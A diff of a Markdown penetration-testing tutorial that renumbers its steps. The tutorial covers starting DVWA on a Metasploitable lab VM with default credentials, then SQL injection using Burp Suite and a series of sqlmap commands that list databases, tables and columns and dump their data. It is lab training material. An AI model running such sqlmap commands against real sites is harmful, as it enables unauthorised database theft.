@@ -30,11 +30,11 @@ Web application penetration testing is the process of using penetration testing 
 
 ## Starting DVWA 
 
-**Step 1** : Start Metasploitable VM in Brdige Network Adapter<br>
-**Step 2** : Login to Metasploitable default credentials ``msfadmin:msfadmin``<br>
-**Step 3** : Note the IP of Metasploitable<br>
-**Step 4** : Browse that IP on any browser except Google Chrome <br>
-**Step 5** : Login to DVWA default credentials ``admin:password`` <br>
+**1** : Start Metasploitable VM in Brdige Network Adapter<br>
+**2** : Login to Metasploitable default credentials ``msfadmin:msfadmin``<br>
+**3** : Note the IP of Metasploitable<br>
+**4** : Browse that IP on any browser except Google Chrome <br>
+**5** : Login to DVWA default credentials ``admin:password`` <br>
 
 ## Exploiting DVWA
 
@@ -120,36 +120,37 @@ In the browser address bar, enter the following:<br>
 SQL Injection (SQLi) is a type of an injection attack that makes it possible to execute malicious SQL statements. These statements control a database server behind a web application. Attackers can use SQL Injection vulnerabilities to bypass application security measures. They can go around authentication and authorization of a web page or web application and retrieve the content of the entire SQL database. They can also use SQL Injection to add, modify, and delete records in the database.
 
 #### Tool Used
-**sqlmap** : sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a kick-ass detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.<br><br>
+**sqlmap** : sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a kick-ass detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.
 
-**Step 1** : Start Burpsuite<br><br>
-**Step 2** : Install burp extenstion CO2 from Bwapp store from extension section  <br><br>
-**Step 3** : Set browser proxy to IP 127.0.0.1 and PORT 8080<br><br>
-**Step 4** : Intercept the DVWA traffic for sql <br><br>
-**Step 5** : Send that traffic to sqlmapper by right clicking on the intercept part<br><br>
-**Step 6** : Copy the code from CO2 sqlmap command<br><br>
-**Step 7** : The copied command will be like this <br>``-u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7"``<br><br>
-**Step 8** : Execute the folling commands<br>
+#### STEPS :
+**1** : Start Burpsuite<br><br>
+**2** : Install burp extenstion CO2 from Bwapp store from extension section  <br><br>
+**3** : Set browser proxy to IP 127.0.0.1 and PORT 8080<br><br>
+**4** : Intercept the DVWA traffic for sql <br><br>
+**5** : Send that traffic to sqlmapper by right clicking on the intercept part<br><br>
+**6** : Copy the code from CO2 sqlmap command<br><br>
+**7** : The copied command will be like this <br>``-u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7"``<br><br>
+**8** : Execute the folling commands<br>
 ```
 sqlmap -u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7" --dbs
 ``` 
 The above command will list the database anem which is present on the website if it is vulnerable. So from the list of database name copy any one database name which you want to explore more.<br><br>
-**Step 9** : Execute the folling commands
+**9** : Execute the folling commands
 ```
 sqlmap -u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7" --dbs -D <The database name you copied earlier> --tables
 ```
 Now this command will list the table name of that database<br><br>
-**Step 10** : Execute the folling commands
+**10** : Execute the folling commands
 ```
 sqlmap -u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7" --dbs -D <The database name you copied earlier> -T <table name> --columns
 ```
 The above command will list the coulmns name of the table<br><br>
-**Step 11** : Execute the folling commands
+**11** : Execute the folling commands
 ```
 sqlmap -u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7" --dbs -D <The database name you copied earlier> -T <table name> -C <columns>
 ```
 This command will list all the data which is present in that column<br><br>
-**Step 12** : Execute the folling commands
+**12** : Execute the folling commands
 ```
 sqlmap -u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7" --dbs -D <The database name you copied earlier> -T <table name> -C <column name> --dump
 ```
